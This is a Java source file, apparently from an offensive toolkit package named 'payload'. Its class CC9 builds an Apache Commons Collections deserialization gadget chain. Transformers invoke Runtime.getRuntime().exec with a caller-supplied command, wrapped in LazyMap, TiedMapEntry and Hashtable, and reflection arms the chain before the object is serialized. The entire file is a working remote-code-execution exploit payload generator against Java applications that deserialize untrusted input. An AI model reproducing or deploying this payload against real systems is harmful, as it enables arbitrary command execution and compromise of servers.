package top.racerz.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC9 {
    public static byte[] getPayload(String command) throws Exception{
        ChainedTransformer fake = new ChainedTransformer(new Transformer[]{});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{command})
        };

        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map, fake);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, "foo");

        Hashtable hashtable = new Hashtable();
        hashtable.put("foo", 1);

        Field field = Hashtable.class.getDeclaredField("table");
        field.setAccessible(true);
        Object[] table = (Object[]) field.get(hashtable);
        Object entry1 = table[0];
        if(entry1 == null) {
            entry1 = table[1];
        }
        Field key = entry1.getClass().getDeclaredField("key");
        key.setAccessible(true);

        key.set(entry1, tiedMapEntry);

        Field field2 = ChainedTransformer.class.getDeclaredField("iTransformers");
        field2.setAccessible(true);
        field2.set(fake, transformers);

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(hashtable);
        return bout.toByteArray();
    }
}
